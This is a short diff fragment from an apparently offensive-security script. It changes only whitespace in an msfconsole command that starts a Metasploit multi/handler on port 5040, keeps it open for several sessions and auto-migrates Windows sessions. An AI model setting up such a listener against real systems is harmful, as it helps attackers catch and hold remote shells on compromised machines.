@@ -21,5 +21,5 @@ msfconsole -q -x "use exploit/multi/handler; \
                   set LHOST 0.0.0.0; \
                   set LPORT 5040; \
                   set ExitOnSession false; \
-				  set AutoRunScript /post/windows/manage/migrate; \
+		  set AutoRunScript /post/windows/manage/migrate; \
                   exploit"
